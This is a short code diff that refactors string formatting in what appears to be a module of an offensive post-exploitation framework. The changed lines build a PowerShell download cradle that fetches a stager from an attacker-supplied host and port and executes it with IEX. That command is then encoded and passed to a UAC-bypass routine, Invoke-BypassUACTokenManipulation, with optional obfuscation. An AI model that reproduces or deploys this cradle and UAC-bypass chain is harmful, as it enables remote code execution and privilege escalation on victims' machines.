@@ -34,9 +34,7 @@ class Module:
             blank_command = ""
             powershell_command = ""
             encoded_cradle = ""
-            cradle = "IEX \"(new-object net.webclient).downloadstring('{}:{}/{}')\"|IEX".format(
-                host, port, stager
-            )
+            cradle = f"IEX \"(new-object net.webclient).downloadstring('{host}:{port}/{stager}')\"|IEX"
             # Remove weird chars that could have been added by ISE
             n = re.compile("(\xef|\xbb|\xbf)")
             # loop through each character and insert null byte
@@ -52,14 +50,13 @@ class Module:
         except Exception:
             pass
 
-        script_end = 'Invoke-BypassUACTokenManipulation -Arguments "-w 1 -enc %s"' % (
-            encoded_cradle
+        script_end = (
+            f'Invoke-BypassUACTokenManipulation -Arguments "-w 1 -enc {encoded_cradle}"'
         )
 
-        script = main_menu.modulesv2.finalize_module(
+        return main_menu.modulesv2.finalize_module(
             script=script,
             script_end=script_end,
             obfuscate=obfuscate,
             obfuscation_command=obfuscation_command,
         )
-        return script
